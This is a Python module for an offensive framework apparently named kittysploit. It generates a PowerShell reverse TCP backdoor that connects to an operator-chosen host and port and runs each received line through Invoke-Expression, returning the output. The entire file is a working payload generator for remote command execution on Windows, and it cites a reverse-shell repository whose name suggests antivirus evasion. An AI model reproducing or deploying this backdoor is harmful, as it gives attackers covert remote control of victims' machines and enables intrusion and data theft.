from kittysploit import *


class Module(Backdoor):
    __info__ = {
        "name": "PowerShell reverse TCP line shell",
        "description": (
            "Writes a PowerShell script that connects back over TCP and executes "
            "each received line via Invoke-Expression (line-oriented command channel)."
        ),
        "author": "Kittysploit",
        "platform": Platform.WINDOWS,
        "session_type": SessionType.SHELL,
        "listener": "listeners/multi/reverse_tcp",
        "references": [
            "https://github.com/tihanyin/PSSW100AVB/blob/main/ReverseShell_2026_05.ps1"
        ]
    }

    lhost = OptString("127.0.0.1", "Connect-back IP address", True)
    lport = OptPort(4444, "Connect-back TCP port", True)

    def run(self):
        raw_host = str(self.lhost)
        host = raw_host.replace('"', '`"')
        port = int(self.lport)
        script = f"""$core = "{host}"
$port = {port}
$socket = $null
try {{
    $socket = New-Object System.Net.Sockets.Socket(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp)
    $socket.Connect($core, $port)
    $stream = New-Object System.Net.Sockets.NetworkStream($socket)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.Write("$core > ")
    while ($socket.Connected) {{
        $packet = $reader.ReadLine()
        if ($packet) {{
            try {{
                $output = Invoke-Expression $packet 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Write("$core > ")
            }} catch {{
                $writer.WriteLine("Sync Error: " + $_.Exception.Message)
            }}
        }}
    }}
}} catch {{
    exit
}} finally {{
    if ($socket) {{ $socket.Close() }}
}}
"""
        filename = self.random_text(8) + ".ps1"
        self.write_out_dir(filename, script)
        print_success(f"Generated: {filename}")
        return True
